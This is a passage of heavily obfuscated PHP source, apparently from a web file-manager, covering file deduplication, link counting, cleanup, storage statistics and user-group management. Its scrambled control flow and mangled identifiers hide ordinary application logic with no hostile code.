$F∏ﬂâåÆ“ì[$Aÿ¯£ëïù¡[364]], $Aÿ¯£ëïù¡[384] => $cãØ‹Ÿ“≈‚, $Aÿ¯£ëïù¡[2069] => $FèﬁŒè–√[$Aÿ¯£ëïù¡[161]] ? $FèﬁŒè–√[$Aÿ¯£ëïù¡[161]] : IO::hashSimple($cãØ‹Ÿ“≈‚), $Aÿ¯£ëïù¡[2070] => $DÂÖﬂì±œ ? $DÂÖﬂì±œ : $Eõçöã’íΩ); goto B∞ö—‡ÿõ®; d¡∑è¬ÖÔú: $Aÿ¯£ëïù¡ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!IO::exist($cãØ‹Ÿ“≈‚)) { return !1; } $Eõçöã’íΩ = $FèﬁŒè–√[$Aÿ¯£ëïù¡[160]] ? $FèﬁŒè–√[$Aÿ¯£ëïù¡[160]] : $Aÿ¯£ëïù¡[33]; goto aŒ–‹êÉÓÉ; B∞ö—‡ÿõ®: if ($E·ÈñÑí„’ = $this->addFileCheckExist($c·–Ú√íªå[$Aÿ¯£ëïù¡[161]], $c·–Ú√íªå[$Aÿ¯£ëïù¡[160]], $c·–Ú√íªå[$Aÿ¯£ëïù¡[78]])) { return $E·ÈñÑí„’; } return $this->addFileData($c·–Ú√íªå); goto Fù©êúÌÔﬁ; Fù©êúÌÔﬁ: } private function addFileData($AææŸüù®ò) { $cå ≥¥‘¢Œ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$AææŸüù®ò) { return !1; } $AææŸüù®ò[$cå ≥¥‘¢Œ[78]] = intval($AææŸüù®ò[$cå ≥¥‘¢Œ[78]]); if (!$AææŸüù®ò[$cå ≥¥‘¢Œ[78]] && strlen($AææŸüù®ò[$cå ≥¥‘¢Œ[161]]) > 32) { $AææŸüù®ò[$cå ≥¥‘¢Œ[78]] = intval(substr($AææŸüù®ò[$cå ≥¥‘¢Œ[161]], 32)); } $C“Èƒå◊Ò  = $this->add($AææŸüù®ò); return $this->find($C“Èƒå◊Ò ); } public function addFile($DÃö‰Øµ±ı, $Fçöπß™òƒ, $aº£éÍåÑ¢ = false) { $BèÊË˜¢˜ = IO::hashSimple($DÃö‰Øµ±ı); $e¯∆ìÈ˘é◊ = IO::hashMd5($DÃö‰Øµ±ı); $E¢çﬂû≤Ñ∞ = IO::size($DÃö‰Øµ±ı); if ($AüêËÓçûË = $this->addFileCheckExist($BèÊË˜¢˜, $e¯∆ìÈ˘é◊, $E¢çﬂû≤Ñ∞)) { return $AüêËÓçûË; } $e©Ù»¿µº¢ = $this->addFileMake($DÃö‰Øµ±ı, $E¢çﬂû≤Ñ∞, $BèÊË˜¢˜, $e¯∆ìÈ˘é◊, $Fçöπß™òƒ, $aº£éÍåÑ¢); return $this->addFileData($e©Ù»¿µº¢); } public function addFileMake($BâÌûø≥É◊, $C≤ƒ÷‚©øÃ, $b´ãØ†Í€ù, $e±èøÙ ëÑ, $C√Ú√Ò§çÍ, $d…óÉä™œÜ) { goto dË÷æ©´∑û; Eˆ›…òìÎÉ: $e€ó¨„≠¢… = KodIO::defaultDriver(); $F¨ëﬂôã¿° = array($f—É≈ô¬Ü‰[512] => $C≤ƒ÷‚©øÃ, $f—É≈ô¬Ü‰[2068] => 1, $f—É≈ô¬Ü‰[383] => $C√Ú√Ò§çÍ, $f—É≈ô¬Ü‰[733] => $e€ó¨„≠¢…[$f—É≈ô¬Ü‰[364]], $f—É≈ô¬Ü‰[384] => $DÙéº¡ÿ‡‹, $f—É≈ô¬Ü‰[2069] => $b´ãØ†Í€ù, $f—É≈ô¬Ü‰[2070] => $e±èøÙ ëÑ); return $F¨ëﬂôã¿°; goto cûìî‰ŒíÊ; dË÷æ©´∑û: $f—É≈ô¬Ü‰ =& $_SERVER[£¿ÌÙëü¡¯¯]; $DÙéº¡ÿ‡‹ = $this->createFileName($C√Ú√Ò§çÍ); $E˜û”Òüáï = get_path_father($DÙéº¡ÿ‡‹); goto D‘Îœ©√¿ñ; D‘Îœ©√¿ñ: $D‚¨ƒ¶“Ÿ◊ = get_path_this($DÙéº¡ÿ‡‹); if ($d…óÉä™œÜ) { $BÌÈ‹¯∆Èê = IO::move($BâÌûø≥É◊, $E˜û”Òüáï, !1, $D‚¨ƒ¶“Ÿ◊); } else { $BÌÈ‹¯∆Èê = IO::copy($BâÌûø≥É◊, $E˜û”Òüáï, !1, $D‚¨ƒ¶“Ÿ◊); } if (!$BÌÈ‹¯∆Èê) { return !1; } goto Eˆ›…òìÎÉ; cûìî‰ŒíÊ: } public function addFileCheckExist($aä®ó÷Ü•ì, $Fπ—øøàö©, $CéÎ›ÁãÃ”) { $fˆöÛò‰ ° =& $_SERVER[£¿ÌÙëü¡¯¯]; $C∫≤™ÜÖø± = $this->findByHash($aä®ó÷Ü•ì, $Fπ—øøàö©); if (!$C∫≤™ÜÖø±) { return !1; } $eªä‰ƒµ÷ï = array($fˆöÛò‰ °[2068] => intval($C∫≤™ÜÖø±[$fˆöÛò‰ °[2071]]) + 1, $fˆöÛò‰ °[512] => $CéÎ›ÁãÃ”); $this->where(array($fˆöÛò‰ °[416] => $C∫≤™ÜÖø±[$fˆöÛò‰ °[415]]))->save($eªä‰ƒµ÷ï); return $C∫≤™ÜÖø±; } public function remove($bﬁÂ¢Ó€¯Æ) { $this->linkCountChange($bﬁÂ¢Ó€¯Æ, !1); $this->clearEmpty(); return !0; } public function linkAdd($eÇàΩâÙ£) { $this->linkCountChange($eÇàΩâÙ£, !0); } public function linkCountChange($a∫ñÛºâŒ, $Bﬂßú´âµÃ) { goto aÂ√‡„ßîù; bıïïÌ√°å: foreach ($fµ¿ÒÊùû¢ as $bãÜùÕü∏” => $eâºÉàßè£) { $FÍìòïüÑΩ = $eâºÉàßè£ . $b◊ä£ΩÆËπ[33]; if (!$EŒÎÁ•Ü‡¿[$FÍìòïüÑΩ]) { $EŒÎÁ•Ü‡¿[$FÍìòïüÑΩ] = array(); } $EŒÎÁ•Ü‡¿[$FÍìòïüÑΩ][] = $bãÜùÕü∏”; } foreach ($EŒÎÁ•Ü‡¿ as $eâºÉàßè£ => $A†êîﬁÜä˘) { if (!$A†êîﬁÜä˘) { continue; } $eâºÉàßè£ = $Bﬂßú´âµÃ ? $eâºÉàßè£ : -intval($eâºÉàßè£); $b–À™Ö¶ìÕ = array($b◊ä£ΩÆËπ[415] => array($b◊ä£ΩÆËπ[7], $A†êîﬁÜä˘)); if ($eâºÉàßè£ < 0) { $b–À™Ö¶ìÕ[$b◊ä£ΩÆËπ[2071]] = array($b◊ä£ΩÆËπ[927], abs($eâºÉàßè£)); } $this->where($b–À™Ö¶ìÕ)->setAdd($b◊ä£ΩÆËπ[2071], $eâºÉàßè£); } goto Fà’Ñ∂÷Ï; aÂ√‡„ßîù: $b◊ä£ΩÆËπ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$a∫ñÛºâŒ) { return; } if (!is_array($a∫ñÛºâŒ)) { $a∫ñÛºâŒ = array($a∫ñÛºâŒ); } goto d∞ã≈ãßÏñ; d∞ã≈ãßÏñ: $fµ¿ÒÊùû¢ = array(); foreach ($a∫ñÛºâŒ as $bãÜùÕü∏”) { $FÍìòïüÑΩ = $bãÜùÕü∏” . $b◊ä£ΩÆËπ[33]; if (!$fµ¿ÒÊùû¢[$FÍìòïüÑΩ]) { $fµ¿ÒÊùû¢[$FÍìòïüÑΩ] = 0; } $fµ¿ÒÊùû¢[$FÍìòïüÑΩ]++; } $EŒÎÁ•Ü‡¿ = array(); goto bıïïÌ√°å; Fà’Ñ∂÷Ï: } public function findByHash($c€«’€„Ÿ∑, $aàΩπﬁ≤πã = false) { $CÒ∂¬∏™Ÿù =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$c€«’€„Ÿ∑ && !$aàΩπﬁ≤πã) { return !1; } $fî¯‡ú´Û∑ = array($CÒ∂¬∏™Ÿù[2069] => $c€«’€„Ÿ∑); if ($aàΩπﬁ≤πã) { $fî¯‡ú´Û∑ = array($CÒ∂¬∏™Ÿù[2070] => $aàΩπﬁ≤πã); } return $this->order($CÒ∂¬∏™Ÿù[2072])->where($fî¯‡ú´Û∑)->find(); } public function clearEmpty($e¥è”ÍÑÏ’ = 0) { goto D¢ÒÖ°Á‰ó; DãÆ∂Æ¬∆‡: $bÖ“ãö•é• = $this->where($B¶¥åÜµŒ¨)->select(); if (!$bÖ“ãö•é•) { return; } $E ⁄ãõÍ ” = new Task($eàåÀ◊àöƒ[2074], $eàåÀ◊àöƒ[33], count($bÖ“ãö•é•)); goto aßù…§á´; aßù…§á´: foreach ($bÖ“ãö•é• as $eΩé»‡•™Ò) { $E ⁄ãõÍ ”->update(1); $this->resetFile($eΩé»‡•™Ò); } $E ⁄ãõÍ ”->end(); goto dßÔâÔ‰»ß; D¢ÒÖ°Á‰ó: $eàåÀ◊àöƒ =& $_SERVER[£¿ÌÙëü¡¯¯]; $dåèÛ‰ÑÕÊ = time() - 3600 * 24 * $e¥è”ÍÑÏ’; $B¶¥åÜµŒ¨ = $eàåÀ◊àöƒ[2073] . $dåèÛ‰ÑÕÊ; goto DãÆ∂Æ¬∆‡; dßÔâÔ‰»ß: } private function resetFile($Dä‰ÿèı§µ) { goto e™™Ü§Ç‚Ü; dâ¡‰∫Ñ∏¶: $E§ÛÙ∏ÏÇ≤ = Model($DﬁÌ›Ã ˜˘[2075])->where($e€“Ë±î„Œ)->count(); $aºÿﬁ¢È⁄≤ = intval($Cè¶≥∑¶´°) + intval($E§ÛÙ∏ÏÇ≤); if ($aºÿﬁ¢È⁄≤ == 0) { IO::remove($Dä‰ÿèı§µ[$DﬁÌ›Ã ˜˘[76]]); $this->where($e€“Ë±î„Œ)->delete(); $this->metaSet($Dä‰ÿèı§µ[$DﬁÌ›Ã ˜˘[415]], null, null); return; } goto A¬à¿∂ÿñï; A¬à¿∂ÿñï: if ($Dä‰ÿèı§µ[$DﬁÌ›Ã ˜˘[2071]] != $aºÿﬁ¢È⁄≤) { $this->where($e€“Ë±î„Œ)->save(array($DﬁÌ›Ã ˜˘[2068] => $aºÿﬁ¢È⁄≤)); } goto B◊»†©‡û¢; e™™Ü§Ç‚Ü: $DﬁÌ›Ã ˜˘ =& $_SERVER[£¿ÌÙëü¡¯¯]; $e€“Ë±î„Œ = array($DﬁÌ›Ã ˜˘[416] => $Dä‰ÿèı§µ[$DﬁÌ›Ã ˜˘[415]]); $Cè¶≥∑¶´° = Model($DﬁÌ›Ã ˜˘[1084])->where($e€“Ë±î„Œ)->count(); goto dâ¡‰∫Ñ∏¶; B◊»†©‡û¢: } public function storageInfo($fœŒ›¶’êú = false) { goto eëìí›ªŒÛ; eëìí›ªŒÛ: $fà´÷Ç§Æ„ =& $_SERVER[£¿ÌÙëü¡¯¯]; $FŸ∑‹Â≤Ωì = $this->count() + 0.0; $BµÉ∞à™¯ø = 0; goto E§ÔÑâ˜†ç; EÑî√∂¯§«: for ($aÏ‹æ™ΩÈì = 0; $aÏ‹æ™ΩÈì < $FŸ∑‹Â≤Ωì; $aÏ‹æ™ΩÈì = $aÏ‹æ™ΩÈì + $bÆπƒõ˘ïÂ) { $dÇœ‡ÜÊØÔ = $this->limit($aÏ‹æ™ΩÈì, $aÏ‹æ™ΩÈì + $bÆπƒõ˘ïÂ)->select(); foreach ($dÇœ‡ÜÊØÔ as $Fìá¥≠ˆ˜) { $Añ∞€¯©€ﬁ += $Fìá¥≠ˆ˜[$fà´÷Ç§Æ„[78]] * $Fìá¥≠ˆ˜[$fà´÷Ç§Æ„[2071]]; $BµÉ∞à™¯ø += $Fìá¥≠ˆ˜[$fà´÷Ç§Æ„[78]] * ($Fìá¥≠ˆ˜[$fà´÷Ç§Æ„[2071]] - 1); $E¡ÿë€§Í‹ += $Fìá¥≠ˆ˜[$fà´÷Ç§Æ„[2071]]; } } $dèúÏÓ‘èÏ = array($fà´÷Ç§Æ„[2076] => $Añ∞€¯©€ﬁ, $fà´÷Ç§Æ„[2077] => $BµÉ∞à™¯ø, $fà´÷Ç§Æ„[2078] => $BµÉ∞à™¯ø / $Añ∞€¯©€ﬁ, $fà´÷Ç§Æ„[82] => $FŸ∑‹Â≤Ωì, $fà´÷Ç§Æ„[2079] => $E¡ÿë€§Í‹); return $dèúÏÓ‘èÏ; goto Fº˜É±ÿıâ; E§ÔÑâ˜†ç: $Añ∞€¯©€ﬁ = 1; $E¡ÿë€§Í‹ = 0; $bÆπƒõ˘ïÂ = 5000; goto EÑî√∂¯§«; Fº˜É±ÿıâ: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\160"; protected $tableMeta = array("\x74\x61\x62\154\145\116\x61\155\145" => "\x67\162\157\165\x70\137\x6d\x65\x74\141", "\155\x65\164\x61\106\151\x65\154\x64" => "\x67\x72\x6f\165\160\x49\x44"); protected function cacheFunctionAlias($EΩÏÑäÁîÔ) { $B∆Í‹ëÊíΩ =& $_SERVER[£¿ÌÙëü¡¯¯]; return array($B∆Í‹ëÊíΩ[2080] => array($EΩÏÑäÁîÔ[0], $B∆Í‹ëÊíΩ[2081]), $B∆Í‹ëÊíΩ[2082] => array($EΩÏÑäÁîÔ[0], $B∆Í‹ëÊíΩ[2081])); } protected function getInfo($f†È¶€∫Æ¢) { $BÚ≤ ∆åüî = $this->getInfoSimple($f†È¶€∫Æ¢); if (!$BÚ≤ ∆åüî) { return !1; } return $this->_listDataApplyItem($BÚ≤ ∆åüî); } protected function getInfoSimple($e£¬∆Í†Æ, $A∫úúø¢çÉ = false) { $F´ÍäÈê√ã =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($A∫úúø¢çÉ) { $e≈ËÍˆ¿ä≥ = array($F´ÍäÈê√ã[2013] => intval($e£¬∆Í†Æ)); return $this->where($e≈ËÍˆ¿ä≥)->find(); } return $this->cacheFunctionGet($F´ÍäÈê√ã[2083], $e£¬∆Í†Æ); } protected function groupAdd($A–¥ôç¶Ñ˘) { goto CÕë»⁄◊«û; CÕë»⁄◊«û: $CùïÑÙ¢‹π =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$A–¥ôç¶Ñ˘[$CùïÑÙ¢‹π[457]] && isset($A–¥ôç¶Ñ˘[$CùïÑÙ¢‹π[2013]]) && $A–¥ôç¶Ñ˘[$CùïÑÙ¢‹π[2013]] == 1) { if ($BØÔ∂Ü•—Ò = $this->getInfoSimple($A–¥ôç¶Ñ˘[$CùïÑÙ¢‹π[2013]], !0)) { return $A–¥ôç¶Ñ˘[$CùïÑÙ¢‹π[2013]]; } } else { $BØÔ∂Ü•—Ò = $this->getInfoSimple($A–¥ôç¶Ñ˘[$CùïÑÙ¢‹π[457]]); if (!$BØÔ∂Ü•—Ò) { return !1; } } $c‰–«∑ãËÇ = $CùïÑÙ¢‹π[2084]; goto A∂åù’ƒ´ú; D°à¥û›…ø: return $aﬂ≠Ó∆ˆ≤ˆ; goto F„∞«ØëÎÆ; A∂åù’ƒ´ú: if ($BØÔ∂Ü•—Ò[$CùïÑÙ¢‹π[455]]) { $c‰–«∑ãËÇ = $BØÔ∂Ü•—Ò[$CùïÑÙ¢‹π[455]] . $BØÔ∂Ü•—Ò[$CùïÑÙ¢‹π[2013]] . $CùïÑÙ¢‹π[47]; } $D⁄Ã«ÌïÜó = array($CùïÑÙ¢‹π[383] => $this->groupNameAuto($A–¥ôç¶Ñ˘[$CùïÑÙ¢‹π[457]], $A–¥ôç¶Ñ˘[$CùïÑÙ¢‹π[28]]), $CùïÑÙ¢‹π[365] => $A–¥ôç¶Ñ˘[$CùïÑÙ¢‹π[457]], $CùïÑÙ¢‹π[517] => $c‰–«∑ãËÇ, $CùïÑÙ¢‹π[2085] => $A–¥ôç¶Ñ˘[$CùïÑÙ¢‹π[1997]], $CùïÑÙ¢‹π[2086] => 0, $CùïÑÙ¢‹π[2017] => 0); if (!empty($A–¥ôç¶Ñ˘[$CùïÑÙ¢‹π[2013]])) { $D⁄Ã«ÌïÜó[$CùïÑÙ¢‹π[2013]] = $A–¥ôç¶Ñ˘[$CùïÑÙ¢‹π[2013]]; } goto c“ª≠Úıπø; c“ª≠Úıπø: $aﬂ≠Ó∆ˆ≤ˆ = $this->add($D⁄Ã«ÌïÜó); $this->setNamePinyin($aﬂ≠Ó∆ˆ≤ˆ, $D⁄Ã«ÌïÜó[$CùïÑÙ¢‹π[28]]); Model($CùïÑÙ¢‹π[1084])->groupRootAdd($aﬂ≠Ó∆ˆ≤ˆ); goto D°à¥û›…ø; F„∞«ØëÎÆ: } protected function groupEdit($fâ≠©á§ï», $FèÃ‹¬öè†) { $E“∞ó´—√è =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!empty($FèÃ‹¬öè†[$E“∞ó´—√è[457]])) { $dÍ∏ÊÏ∫‘Ö = $this->getInfoSimple($fâ≠©á§ï»); $B⁄˘ºù˜Û = $this->getInfoSimple($FèÃ‹¬öè†[$E“∞ó´—√è[457]]); if (!$dÍ∏ÊÏ∫‘Ö || !$B⁄˘ºù˜Û) { return !1; } if ($dÍ∏ÊÏ∫‘Ö[$E“∞ó´—√è[2013]] == $B⁄˘ºù˜Û[$E“∞ó´—√è[2013]]) { return !1; } if ($FèÃ‹¬öè†[$E“∞ó´—√è[457]] != $dÍ∏ÊÏ∫‘Ö[$E“∞ó´—√è[457]]) { if ($B⁄˘ºù˜Û[$E“∞ó´—√è[455]] !== $dÍ∏ÊÏ∫‘Ö[$E“∞ó´—√è[455]] && strpos($B⁄˘ºù˜Û[$E“∞ó´—√è[455]], $dÍ∏ÊÏ∫‘Ö[$E“∞ó´—√è[455]] . $dÍ∏ÊÏ∫‘Ö[$E“∞ó´—√è[2013]] . $E“∞ó´—√è[47]) === 0) { return !1; } $FèÃ‹¬öè†[$E“∞ó´—√è[517]] = $B⁄˘ºù˜Û[$E“∞ó´—√è[455]] . $FèÃ‹¬öè†[$E“∞ó´—√è[457]] . $E“∞ó´—√è[47]; $this->_changeChildLevel($dÍ∏ÊÏ∫‘Ö, $B⁄˘ºù˜Û); } } if (isset($FèÃ‹¬öè†[$E“∞ó´—√è[28]])) { $this->setNamePinyin($fâ≠©á§ï», $FèÃ‹¬öè†[$E“∞ó´—√è[28]]); } return $this->where(array($E“∞ó´—√è[2087] => $fâ≠©á§ï»))->save($FèÃ‹¬öè†); } private function _changeChildLevel($dπéª±—œ“, $a≤∂—ÿªõ√, $a√º◊èπøÃ = false) { goto AÚ˜ÿÙœ§ô; füÈ‡›⁄“Ã: $this->where($DÔ¬Òπ«ﬂ±)->data($d∫‹ãÒ“ªˆ)->save(); goto cÉ·€≈É“Ê; dïç≥ØúäÜ: if ($a√º◊èπøÃ) { $FÌŒÖØÍ«∞ = $a≤∂—ÿªõ√[$B´√–ıí…†[455]] . $a≤∂—ÿªõ√[$B´√–ıí…†[2013]] . $B´√–ıí…†[47]; } $DÔ¬Òπ«ﬂ± = array($B´√–ıí…†[517] => array($B´√–ıí…†[475], $dπéª±—œ“[$B´√–ıí…†[455]] . $dπéª±—œ“[$B´√–ıí…†[2013]] . $B´√–ıí…†[476])); $d∫‹ãÒ“ªˆ = array($B´√–ıí…†[517] => array($B´√–ıí…†[526], "\x72\x65\x70\x6c\141\x63\145\50\160\141\162\145\x6e\x74\x4c\x65\x76\145\x6c\x2c\47{$c»Í⁄£æ•€}\x27\x2c\47{$FÌŒÖØÍ«∞}\47\x29")); goto füÈ‡›⁄“Ã; AÚ˜ÿÙœ§ô: $B´√–ıí…† =& $_SERVER[£¿ÌÙëü¡¯¯]; $c»Í⁄£æ•€ = $dπéª±—œ“[$B´√–ıí…†[455]] . $dπéª±—œ“[$B´√–ıí…†[2013]] . $B´√–ıí…†[47]; $FÌŒÖØÍ«∞ = $a≤∂—ÿªõ√[$B´√–ıí…†[455]] . $a≤∂—ÿªõ√[$B´√–ıí…†[2013]] . $B´√–ıí…†[47] . $dπéª±—œ“[$B´√–ıí…†[2013]] . $B´√–ıí…†[47]; goto dïç≥ØúäÜ; cÉ·€≈É“Ê: } public function setNamePinyin($a˘˘‚∏ÀµÒ, $Eè√ìÂß“å = false) { $EÌÿ”Ò≠ ä =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$Eè√ìÂß“å) { $E£øàâ¯· = $this->getInfoSimple($a˘˘‚∏ÀµÒ); $Eè√ìÂß“å = $E£øàâ¯·[$EÌÿ”Ò≠ ä[28]]; } if (!Input::check($Eè√ìÂß“å, $EÌÿ”Ò≠ ä[520])) { $this->metaSet($a˘˘‚∏ÀµÒ, $EÌÿ”Ò≠ ä[412], null); $this->metaSet($a˘˘‚∏ÀµÒ, $EÌÿ”Ò≠ ä[411], null); return; } $BÖÓŒ…É·ù = array($EÌÿ”Ò≠ ä[412] => str_replace($EÌÿ”Ò≠ ä[50], $EÌÿ”Ò≠ ä[33], Pinyin::encode($Eè√ìÂß“å)), $EÌÿ”Ò≠ ä[411] => Pinyin::encode($Eè√ìÂß“å, $EÌÿ”Ò≠ ä[521])); $this->metaSet($a˘˘‚∏ÀµÒ, $BÖÓŒ…É·ù); } protected function groupRemove($A–∞óŒ°ü) { goto c·À∂”™∫ç; Aé∫ﬁò®ÆÕ: Model($eéØ¿Ã€õª[749])->groupRootRemove($A–∞óŒ°ü); return $this->where($dÙáÉÌ€∆∞)->delete(); goto cê‰é¥œÓÏ; fØ›œ„œ·É: $this->where(array($eéØ¿Ã€õª[457] => $A–∞óŒ°ü))->save(array($eéØ¿Ã€õª[457] => $Dª¯Í≈∞ó[$eéØ¿Ã€õª[457]])); Model($eéØ¿Ã€õª[2088])->where($dÙáÉÌ€∆∞)->delete(); Model($eéØ¿Ã€õª[2089])->where($dÙáÉÌ€∆∞)->delete(); goto Aé∫ﬁò®ÆÕ; C∫üŒõÉì–: if (!$Dª¯Í≈∞ó || $Dª¯Í≈∞ó[$eéØ¿Ã€õª[457]] == 0) { return !1; } $fÌ≥ÖÿºÒ = $this->getInfoSimple($Dª¯Í≈∞ó[$eéØ¿Ã€õª[457]]); $this->_changeChildLevel($Dª¯Í≈∞ó, $fÌ≥ÖÿºÒ, !0); goto fØ›œ„œ·É; c·À∂”™∫ç: $eéØ¿Ã€õª =& $_SERVER[£¿ÌÙëü¡¯¯]; $dÙáÉÌ€∆∞ = array($eéØ¿Ã€õª[2013] => $A–∞óŒ°ü); $Dª¯Í≈∞ó = $this->where($dÙáÉÌ€∆∞)->find(); goto C∫üŒõÉì–; cê‰é¥œÓÏ: } public function listData() { $DÙøµëÓˆî = $this->_makeOrder()->selectPage(50); $this->_listDataApply($DÙøµëÓˆî[$_SERVER[£¿ÌÙëü¡¯¯][350]]); return $DÙøµëÓˆî; } private function _makeOrder($fÎº…∂èÒê = '') { goto aÊ™âÖ¥¥‘; cµÂÙÏŸ®Ñ: $fÎº…∂èÒê = $fÎº…∂èÒê . "{$cŸ«Œ‹ºõî}\x20{$dá⁄Èñ‚ã}\x2c\40\x67\162\x6f\165\160\111\x44\x20\x61\163\143"; return $this->order($fÎº…∂èÒê); goto f±»§µíöë; aÊ™âÖ¥¥‘: $a“’»éíà≥ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Bäˆ¯Œî™È = array($a“’»éíà≥[2013], $a“’»éíà≥[28], $a“’»éíà≥[1999], $a“’»éíà≥[184]); $bƒ‡ó∑òÿã = array($a“’»éíà≥[398] => $a“’»éíà≥[399], $a“’»éíà≥[400] => $a“’»éíà≥[401]); goto Cââ≈…ú§®; Cââ≈…ú§®: $cŸ«Œ‹ºõî = Input::get($a“’»éíà≥[403], $a“’»éíà≥[7], $a“’»éíà≥[2087], $Bäˆ¯Œî™È); $dá⁄Èñ‚ã = Input::get($a“’»éíà≥[404], $a“’»éíà≥[7], $a“’»éíà≥[2090], array($a“’»éíà≥[2090], $a“’»éíà≥[400])); $dá⁄Èñ‚ã = $bƒ‡ó∑òÿã[$dá⁄Èñ‚ã]; goto cµÂÙÏŸ®Ñ; f±»§µíöë: } public function listChild($B€ô’“ÜÛ¢) { $aËÆ’àöñ‚ =& $_SERVER[£¿ÌÙëü¡¯¯]; $B⁄ﬁ•πı â = $this->where(array($aËÆ’àöñ‚[457] => $B€ô’“ÜÛ¢))->_makeOrder()->selectPage(200); $this->_listDataApply($B⁄ﬁ•πı â[$aËÆ’àöñ‚[350]]); return $B⁄ﬁ•πı â; } public function listByID($d⁄‡ƒ∂ÿ—–) { $aﬁ±íπ‹«˜ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$d⁄‡ƒ∂ÿ—–) { return array(); } $eÎ–Ï◊¨ùƒ = array($aﬁ±íπ‹«˜[2013] => array($aﬁ±íπ‹«˜[7], $d⁄‡ƒ∂ÿ—–)); $aâÉ≤·Ùƒ— = $this->where($eÎ–Ï◊¨ùƒ)->select(); $this->_listDataApply($aâÉ≤·Ùƒ—); return $aâÉ≤·Ùƒ—; } public function listSearch($eÑºÖ“°è‰) { goto Fæ≥¿Àé©÷; BÓªÑ•µá˘: if (!trim($a‘ÊÑ®Û˜Ê)) { return !1; } $a‘ÊÑ®Û˜Ê = str_replace($BûèßÕ÷ÿí[2093], $BûèßÕ÷ÿí[2094], $a‘ÊÑ®Û˜Ê); $dƒêî°¿·Ö = array($BûèßÕ÷ÿí[2013] => array($BûèßÕ÷ÿí[748], "\x25{$a‘ÊÑ®Û˜Ê}\45"), $BûèßÕ÷ÿí[28] => array($BûèßÕ÷ÿí[748], "\x25{$a‘ÊÑ®Û˜Ê}\x25"), $BûèßÕ÷ÿí[912] => $BûèßÕ÷ÿí[2095]); goto d≠ÏèûÇ¥®; Fæ≥¿Àé©÷: $BûèßÕ÷ÿí =& $_SERVER[£¿ÌÙëü¡¯¯]; $a‘ÊÑ®Û˜Ê = $eÑºÖ“°è‰[$BûèßÕ÷ÿí[2091]]; $b·˘‹™≠Ï¨ = isset($eÑºÖ“°è‰[$BûèßÕ÷ÿí[2092]]) ? $eÑºÖ“°è‰[$BûèßÕ÷ÿí[2092]] : !1; goto BÓªÑ•µá˘; d≠ÏèûÇ¥®: $F„’◊Í∞à≥ = $this->_makeOrder()->where($dƒêî°¿·Ö)->selectPage(20); $F„’◊Í∞à≥ = $F„’◊Í∞à≥ ? $F„’◊Í∞à≥ : array(); if (!$F„’◊Í∞à≥ || count($F„’◊Í∞à≥[$BûèßÕ÷ÿí[350]]) < 5 && Input::check($a‘ÊÑ®Û˜Ê, $BûèßÕ÷ÿí[303])) { $E≤ıπÑâÒ√ = $this->_searchFromMeta($BûèßÕ÷ÿí[411], $a‘ÊÑ®Û˜Ê, 10); $B’ŸÍ ø¥√ = $this->_searchFromMeta($BûèßÕ÷ÿí[412], $a‘ÊÑ®Û˜Ê, 10); $C•ãÖ•Ï∑¨ = array_merge($E≤ıπÑâÒ√, $B’ŸÍ ø¥√, $F„’◊Í∞à≥[$BûèßÕ÷ÿí[350]]); $F„’◊Í∞à≥[$BûèßÕ÷ÿí[350]] = array_unique_by_key($C•ãÖ•Ï∑¨, $BûèßÕ÷ÿí[2013]); $F„’◊Í∞à≥[$BûèßÕ÷ÿí[347]][$BûèßÕ÷ÿí[348]] = count($F„’◊Í∞à≥[$BûèßÕ÷ÿí[350]]); $F„’◊Í∞à≥[$BûèßÕ÷ÿí[347]][$BûèßÕ÷ÿí[349]] = ceil($F„’◊Í∞à≥[$BûèßÕ÷ÿí[347]][$BûèßÕ÷ÿí[348]] / $F„’◊Í∞à≥[$BûèßÕ÷ÿí[347]][$BûèßÕ÷ÿí[345]]); } goto c◊Ñ÷îÕ€™; c◊Ñ÷îÕ€™: $this->_listDataApply($F„’◊Í∞à≥[$BûèßÕ÷ÿí[350]]); return $F„’◊Í∞à≥; goto c«∫êﬂ√¡É; c«∫êﬂ√¡É: } private function _searchFromMeta($bı¿í«ù–Ÿ, $Cì≠øëπ®à, $DïŒÉ‹Óáπ) { goto B¿©Á≠©∂ü; CÜ”…ôã¡±: $bÕÖ⁄“©ﬂ∞ = Model($B≤óÑ∑Ÿÿó[2096])->where($EôìÃ·ﬂ∏)->limit($DïŒÉ‹Óáπ)->select(); if (!$bÕÖ⁄“©ﬂ∞) { return array(); } $bÕÖ⁄“©ﬂ∞ = array_to_keyvalue($bÕÖ⁄“©ﬂ∞, $B≤óÑ∑Ÿÿó[33], $B≤óÑ∑Ÿÿó[2013]); goto Bú≠Æ≈Õ Ú; Bú≠Æ≈Õ Ú: $dıºŒΩ≤àó = $this->where(array($B≤óÑ∑Ÿÿó[2087] => array($B≤óÑ∑Ÿÿó[7], $bÕÖ⁄“©ﬂ∞)))->select(); if (!$dıºŒΩ≤àó) { return array(); } return $dıºŒΩ≤àó; goto EÌÙáÉâú∏; B¿©Á≠©∂ü: $B≤óÑ∑Ÿÿó =& $_SERVER[£¿ÌÙëü¡¯¯]; $Cì≠øëπ®à = strtolower($Cì≠øëπ®à); $EôìÃ·ﬂ∏ = array($B≤óÑ∑Ÿÿó[90] => $bı¿í«ù–Ÿ, $B≤óÑ∑Ÿÿó[354] => array($B≤óÑ∑Ÿÿó[748], "\x25{$Cì≠øëπ®à}\45")); goto CÜ”…ôã¡±; EÌÙáÉâú∏: } protected function _listDataApplyItem($d†ÛÜ€∂ò£) { $Béèôˆ·êÎ = array($d†ÛÜ€∂ò£); $this->_listDataApply($Béèôˆ·êÎ); return $Béèôˆ·êÎ[0]; } protected function _listDataApply(&$f™Óí∏èﬁ©) { goto e≤Êã∂∏Â¬; e≤Êã∂∏Â¬: $eÕ úÍÀ√ó =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$f™Óí∏èﬁ©) { return; } $Fƒ∑§è—®• = array_to_keyvalue($f™Óí∏èﬁ©, $eÕ úÍÀ√ó[33], $eÕ úÍÀ√ó[2013]); goto e«‚§ôúÒ±; e«‚§ôúÒ±: 